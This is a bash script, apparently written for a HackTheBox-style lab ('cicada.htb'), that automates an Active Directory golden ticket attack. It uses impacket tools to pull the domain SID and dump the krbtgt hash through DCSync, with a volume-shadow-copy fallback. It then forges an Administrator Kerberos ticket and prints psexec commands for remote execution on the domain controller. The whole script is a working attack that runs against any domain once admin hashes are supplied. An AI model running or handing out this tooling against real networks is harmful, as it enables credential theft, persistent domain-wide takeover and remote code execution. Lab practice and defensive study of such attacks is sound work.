#!/bin/bash

# Visual Header
echo -e "\e[1;33m"
echo "=========================================================="
echo "    GOLDEN TICKET GENERATOR (DRSUAPI + VSS FALLBACK)    "
echo "=========================================================="
echo -e "\e[0m"

# Get User Inputs
read -p "[?] Target Domain (e.g., cicada.htb): " DOMAIN
read -p "[?] Domain Controller IP: " IP
read -p "[?] Admin Username: " ADMIN_USER
read -p "[?] Admin NTLM Hash: " ADMIN_HASH

echo -e "\n\e[1;34m[*] Phase 1: Extracting Domain SID...\e[0m"
SID=$(impacket-lookupsid ${DOMAIN}/${ADMIN_USER}@${IP} -hashes :${ADMIN_HASH} 2>/dev/null | grep -oP 'S-1-5-21-\d+-\d+-\d+' | head -n 1)

if [ -z "$SID" ]; then
    echo -e "\e[1;31m[-] Error: Could not retrieve SID. Verify credentials.\e[0m"
    exit 1
fi
echo -e "\e[1;32m[+] Domain SID: $SID\e[0m"

echo -e "\e[1;34m[*] Phase 2: Grabbing KRBTGT hash...\e[0m"

echo -e "[*] Attempting DRSUAPI (DCSync)..."
KRBTGT_HASH=$(impacket-secretsdump ${DOMAIN}/${ADMIN_USER}@${IP} -hashes :${ADMIN_HASH} -just-dc-user krbtgt 2>/dev/null | grep "krbtgt:" | cut -d ":" -f 4)

# Fallback to VSS if DCSync fails
if [ -z "$KRBTGT_HASH" ]; then
    echo -e "\e[1;33m[!] DCSync failed. Trying -use-vss method...\e[0m"
    KRBTGT_HASH=$(impacket-secretsdump ${DOMAIN}/${ADMIN_USER}@${IP} -hashes :${ADMIN_HASH} -use-vss 2>/dev/null | grep "krbtgt:" | head -n 1 | cut -d ":" -f 4)
fi

if [ -z "$KRBTGT_HASH" ]; then
    echo -e "\e[1;31m[-] Error: Failed to retrieve KRBTGT hash.\e[0m"
    exit 1
fi
echo -e "\e[1;32m[+] KRBTGT Hash Found: $KRBTGT_HASH\e[0m"

echo -e "\e[1;34m[*] Phase 3: Forging Golden Ticket...\e[0m"
impacket-ticketer -nthash ${KRBTGT_HASH} -domain-sid ${SID} -domain ${DOMAIN} Administrator

if [ -f "Administrator.ccache" ]; then
    echo -e "\e[1;32m[+] Success! Ticket created.\e[0m"
    echo -e "\n\e[1;33m--- NEXT STEPS ---\e[0m"
    echo "1. Run: export KRB5CCNAME=\$(pwd)/Administrator.ccache"
    echo "2. Run: impacket-psexec ${DOMAIN}/Administrator@CICADA-DC.${DOMAIN} -k -no-pass"
else
    echo -e "\e[1;31m[-] Error: Ticket file generation failed.\e[0m"
fi
